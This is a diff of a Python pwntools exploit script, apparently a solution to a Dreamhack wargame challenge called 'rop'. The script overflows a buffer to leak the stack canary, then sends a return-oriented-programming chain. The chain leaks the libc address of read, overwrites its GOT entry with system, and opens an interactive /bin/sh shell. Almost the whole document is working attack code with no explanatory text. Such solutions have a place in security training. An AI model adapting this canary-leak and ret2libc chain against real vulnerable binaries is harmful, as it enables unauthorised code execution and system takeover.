@@ -1,14 +1,55 @@
 from pwn import *
-def slog(name, addr): return success(': '.join([name, hex(addr)]))
 
+p = process("./rop")
+#p = remote("host8.dreamhack.games",10574)
+e = ELF("./rop")
+libc = ELF("./libc.so.6")
 
-e= ELF('/libc.so.6')
-#p= remote("host3.dreamhack.games",21198)
-p = process("rop")
-buf = b'A'*0x38
-p.sendafter('Buf: ',buf+b'A')
-p.recvuntil(buf+b'A')
-canary = u64(b'\x00'+p.recv(7))
-slog('canary',canary)
+context.update(arch='amd64', os='linux')
+
+pop_rsi_r15 = 0x400851
+pop_rdi = 0x400853
+ret = 0x400596
+
+write_plt = e.plt["write"]
+read_plt = e.plt["read"]
+read_got = e.got["read"]
+
+payload = b'A'*0x39
+
+p.sendafter("Buf: ",payload)
+p.recvuntil(payload)
+canary = u64(b"\00"+p.recv(7))
+
+payload = b'A'*0x38
+payload += p64(canary)
+payload += b'B'*0x8
+
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi_r15)
+payload += p64(read_got)
+payload += p64(0)
+payload += p64(write_plt)
+
+payload += p64(pop_rdi)
+payload += p64(0)
+payload += p64(pop_rsi_r15)
+payload += p64(read_got)
+payload += p64(0)
+payload += p64(read_plt)
+
+payload += p64(pop_rdi)
+payload += p64(read_got + 0x8)
+payload += p64(ret)
+payload += p64(read_plt)
+
+p.sendafter("Buf: ",payload)
+
+Read = u64(p.recvn(6)+b'\x00'*2)
+lb = Read - libc.symbols["read"]
+system = lb + libc.symbols["system"]
+
+p.send(p64(system)+ b'/bin/sh\x00')
 
 p.interactive()
